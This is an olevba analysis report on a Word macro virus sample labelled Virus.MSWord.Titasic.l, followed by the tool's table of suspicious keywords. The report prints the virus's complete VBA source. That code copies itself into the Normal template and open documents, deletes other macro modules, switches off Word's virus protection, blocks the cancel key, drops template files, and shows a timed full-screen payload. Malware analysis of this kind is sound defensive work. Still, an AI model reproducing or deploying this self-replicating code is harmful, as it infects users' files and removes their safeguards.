olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.l-cde1d69271f0ecaad45f6f3fb3c7ba1f84f63a8d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.l-cde1d69271f0ecaad45f6f3fb3c7ba1f84f63a8d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Minutes.bas 
in file: Virus.MSWord.Titasic.l-cde1d69271f0ecaad45f6f3fb3c7ba1f84f63a8d - OLE stream: 'Macros/VBA/Minutes'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public NonFortyFive As Boolean, afound As Boolean, Setup As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function KungfuMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "Minutes"
nmak(1) = "FortyFive"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SLea.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SLea.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SLea.src"
End If

Tarzan aDes
With aDes.VBProject
If Not (Not Setup And .Description = "Minutes" And .VBComponents.Count > 2) Then
    Gogon aSrc, aDes, nmak
    Setup = False
    .Description = "Minutes"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnSony = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
GoldStar
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If err.Number = 50289 Then MsgBox "Terimakasih Eloe Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "'45-Minutes"
End Function
Sub Tarzan(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonFortyFive = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "Minutes" And nmak.Name <> "FortyFive" Then
        Setup = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Gogon(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Sony()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "'45-Minutes"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "'45-Minutes," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
FortyFive.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
Sharp
ActiveDocument.Close 0
Panasonic
End Sub
Sub FileOpen()
Sharp
If Dialogs(80).Show <> 0 Then
Panasonic
AutoOpen
Else
Panasonic
End If
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
KungfuMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    Setup = False
    KungfuMaster
    End If
    Next
End If
If Now > DateSerial(1998, 12, 26) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="Minutes.Sony"
End
End Sub
Sub ViewVbCode()
Dim Mystring
If MsgBox("It runs like a river through my heart, My love for you will live forever" & Chr(13) & "Like the Earth itself and all that is life.." & Chr(13) & Chr(13) _
& "Thank you for being  a part of my life,  If I had to do it over again, I'd do it with you.." & Chr(13) & Chr(13) & "Have A Nice Day....." & Chr(13) & Chr(13) & " Good Bye...!", vbExclamation + vbOKOnly, "                                         '45-Minutes'") _
= vbOK Then Mystring = "I Do Love You"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
KungfuMaster
Sharp
AddIns.Unload False
Panasonic
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
Sharp
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SLea.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
KungfuMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SLea.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SLea.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
Panasonic
End Sub
Sub ToolsMacro()
Panasonic
On Error GoTo batal
Tarzan ActiveDocument
If NonFortyFive Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".Minutes.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros '45-Minutes mungkin tidak bisa Eloe Setup, Eloe hanya bisa mensetup makro buatan Eloe (Descr: 'Makro non-FortyFive')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
Panasonic
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
Panasonic
Dialogs(180).Show
End Sub
Function GoldStar()
reset = True
FileTemplates
Tarzan aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "'45-Minutes" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SLea.dot" Then KungfuMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function Sharp()
WordBasic.DisableAutoMacros True
End Function
Function Panasonic()
WordBasic.DisableAutoMacros False
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
